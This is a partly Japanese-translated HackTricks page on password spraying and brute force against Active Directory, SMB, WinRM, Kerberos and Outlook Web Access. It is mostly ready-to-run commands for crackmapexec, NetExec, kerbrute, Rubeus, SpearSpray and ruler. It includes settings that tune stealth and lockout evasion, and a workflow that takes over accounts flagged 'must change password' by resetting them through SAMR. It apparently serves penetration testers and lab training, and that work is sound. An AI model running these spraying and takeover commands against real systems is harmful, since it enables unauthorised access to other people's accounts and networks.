# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

いくつかの**valid usernames**を見つけたら、発見した各ユーザーに対して最も一般的な**common passwords**を試すことができます（環境の**password policy**を考慮してください）。\
デフォルトでは、**minimum** **password** **length**は**7**です。

一般的な**usernames**のリストも役立ちます: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

注意：**複数の間違ったpasswordsを試すと、いくつかのアカウントがlockoutされる可能性があります**（デフォルトでは10回以上）。

### password policy の取得

ドメインユーザーの資格情報やシェルがある場合、**password policy を取得するには次を使用できます**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux（またはすべて）からのExploitation

- 使用 **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- **NetExec (CME successor)** を使用した、SMB/WinRM に対するターゲットを絞った低ノイズな spraying:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) を使用する (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(ロックアウトを避けるために試行回数を指定できます):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) を使用 (python) - 推奨されません。場合によっては動作しません
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Metasploit の `scanner/smb/smb_login` モジュールを使用して:

![](<../../images/image (745).png>)

- **rpcclient** を使用して:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windowsから

- [Rubeus](https://github.com/Zer1t0/Rubeus) の brute モジュール付きバージョンで:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) を使用して (デフォルトでドメインからユーザを生成でき、ドメインからパスワードポリシーを取得してそれに従って試行回数を制限します):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) を使用して
```
Invoke-SprayEmptyPassword
```
### 「Password must change at next logon」アカウントの特定と乗っ取り (SAMR)

低ノイズな手法の一つは、spray a benign/empty password を実行して STATUS_PASSWORD_MUST_CHANGE を返すアカウントを検出することです。これはパスワードが強制的に期限切れにされており、古いパスワードを知らなくても変更できることを示します。

Workflow:
- ユーザーを列挙して（RID brute via SAMR）ターゲットリストを作成する:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray an empty password を試し、ヒットが出ても続けて、次回ログオン時に password を変更する必要があるアカウントを取得する:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 各ヒットについて、NetExecのモジュールを使ってSAMR経由でpasswordを変更する（"must change" が設定されている場合、古い password は不要）：
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
運用上の注意:
- Kerberos ベースの操作を行う前に、ホストの時計が DC と同期していることを確認してください: `sudo ntpdate <dc_fqdn>`.
- 一部のモジュール (例: RDP/WinRM) で (Pwn3d!) が付かない [+] は、creds は有効だがアカウントに対話型ログオン権限がないことを意味します。

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth によるスプレーは SMB/NTLM/LDAP バインド試行と比べてノイズが少なく、AD のロックアウトポリシーとより整合します。SpearSpray は LDAP 駆動のターゲティング、パターンエンジン、ポリシー認識（domain policy + PSOs + badPwdCount buffer）を組み合わせて、正確かつ安全にスプレーを行います。侵害したプリンシパルを Neo4j にタグ付けして BloodHound のパス探索に利用することもできます。

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- ドメインのロックアウトポリシーと PSO 対応フィルタリングにより、設定可能な試行バッファ（threshold）を残してユーザのロックを回避します。
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- 名前や各ユーザの pwdLastSet から導出された時刻値などの変数を使った、パターンベースのユーザごとのパスワード生成。
- スループット制御：threads、jitter、および max requests per second による調整。
- Optional Neo4j integration to mark owned users for BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
ターゲティングとパターンの制御:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
ステルスと安全対策:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound のエンリッチメント:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
パターンシステムの概要 (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- より権威ある badPwdCount とポリシー関連情報を取得するには、-dc オプションで PDC-emulator に問い合わせることを優先してください。
- badPwdCount のリセットは観測ウィンドウ後の次の試行で発生します。安全を保つため、しきい値とタイミングを考慮してください。
- Kerberos pre-auth の試行は DC のテレメトリで 4768/4771 として現れます。jitter と rate-limiting を使って目立たないようにしてください。

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

p**assword spraying outlook** のためのツールが複数あります。

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) を使用
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) を使用
- [Ruler](https://github.com/sensepost/ruler) （信頼性あり！）
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell) を使用
- [MailSniper](https://github.com/dafthack/MailSniper) (Powershell) を使用

これらのツールを使うには、ユーザーリストとスプレーするための password または少数の password リストが必要です。
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## 参考資料

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
